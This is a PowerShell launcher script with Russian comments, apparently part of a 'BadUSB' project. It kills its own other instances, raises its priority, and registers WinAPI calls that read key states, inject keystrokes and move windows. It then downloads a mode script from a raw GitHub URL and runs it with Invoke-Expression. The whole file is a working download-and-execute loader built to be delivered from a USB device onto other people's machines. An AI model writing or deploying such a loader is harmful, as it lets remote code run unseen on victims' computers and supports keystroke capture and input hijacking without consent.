param (
    [string]$mode = "kill"
)

# 1. Проверка сети
if (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable()) { exit }

$currentTag = "WindowDance_Instance"
$host.ui.RawUI.WindowTitle = $currentTag

# 2. Функция остановки других копий
function Stop-AllDances {
    [void](Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
        $_.MainWindowTitle -eq $currentTag -and $_.Id -ne $PID 
    } | Stop-Process -Force)
}

if ($mode -eq "kill" -or $mode -eq "stop") { Stop-AllDances; exit }
Stop-AllDances

# 3. Настройка приоритета
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try { ([System.Diagnostics.Process]::GetCurrentProcess()).PriorityClass = if($isAdmin){"High"}else{"AboveNormal"} } catch{}

# 4. Регистрация WinApi (будет доступно во всех подгружаемых скриптах)
Add-Type -AssemblyName System.Windows.Forms
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtInfo);
    public struct RECT { public int Left, Top, Right, Bottom; }
}
"@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

# 5. Общие переменные среды
$SWP_FLAGS = 0x0001 -bor 0x0004 -bor 0x0010 -bor 0x4000
$workArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea

# 6. Динамическая загрузка модуля из вашего GitHub
$repoUrl = "https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main"
$targetFile = "Win_$mode.ps1"
$fullUrl = "$repoUrl/$targetFile"

try {
    # Загружаем код режима
    $scriptBlock = Invoke-RestMethod -Uri $fullUrl -ErrorAction Stop
    
    # Запускаем его в текущем контексте (чтобы были доступны WinApi и переменные)
    Write-Host "Running mode: $mode" -ForegroundColor Green
    Invoke-Expression $scriptBlock
} 
catch {
    Write-Host "Error: Mode '$mode' not found in repository or connection failed." -ForegroundColor Red
    exit
}
